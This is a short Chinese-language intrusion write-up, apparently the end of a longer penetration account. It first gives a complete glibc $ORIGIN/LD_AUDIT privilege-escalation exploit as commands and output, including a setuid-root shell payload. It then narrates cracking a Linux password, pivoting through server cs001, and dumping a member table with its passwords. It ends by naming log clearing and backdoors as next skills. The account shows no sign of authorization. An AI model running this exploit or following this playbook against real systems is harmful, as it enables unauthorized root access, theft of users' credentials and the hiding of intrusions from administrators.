在/tmp下创建可控制的目录
$ mkdir /tmp/exploit

链接到suid二进制程序以更改$ORIGIN的定义
$ ln /bin/ping /tmp/exploit/target

打开到目标二进制程序的文件描述符
$ exec 3< /tmp/exploit/target

现在可通过/proc访问描述符
$ ls -l /proc/$$/fd/3 lr-x------ 1 taviso taviso 64 Oct 15 09:21 /proc/10836/fd/3 -> /tmp/exploit/target*

删除之前所创建的目录
$ rm -rf /tmp/exploit/

/proc链接仍存在，但已标记为已被删除
$ ls -l /proc/$$/fd/3 lr-x------ 1 taviso taviso 64 Oct 15 09:21 /proc/10836/fd/3 -> /tmp/exploit/target (deleted)

使用负载DSO替换目录，使$ORIGIN成为到dlopen()的有效目标
$ cat > payload.c void __attribute__((constructor)) init() { setuid(0); system("/bin/bash"); } ^D $ gcc -w -fPIC -shared -o /tmp/exploit payload.c $ ls -l /tmp/exploit -rwxrwx--- 1 taviso taviso 4.2K Oct 15 09:22 /tmp/exploit*

通过LD_AUDIT强制/proc中的链接加载$ORIGIN
$ LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3 sh-4.1# whoami root sh-4.1# id uid=0(root) gid=500(taviso)

思路又再次卡死

黎明出现。
某人把之前扔给跑的Linux密码破解出来了,用破出来的密码尝试登录cs001，可登录，并通过cs001这台服务器查看操作历史记录连接多台数据库，并且与之前注入点一台也可连接。
通过信息收集。发现主业务数据库连接并把会员表以及会员密码脱了下来。

总结：
历时1个月时间，总体来说有很多思想上面的东西很欠缺，其一，在主站查找漏洞的时候没有深入的进行扫描二级子目录，漏掉了可直接上传WebShell的页面
最后关键成功点还是在于能破出Linux密码。
此次渗透和细心运气分不开，如果没有找到那一台跳板其它都是将无用，不过结果还有一点不足，但至少还在努力。
需要进行学习的是，清除Linux日志、留后门维持访问、以及清析的思路加上跳跃思路。
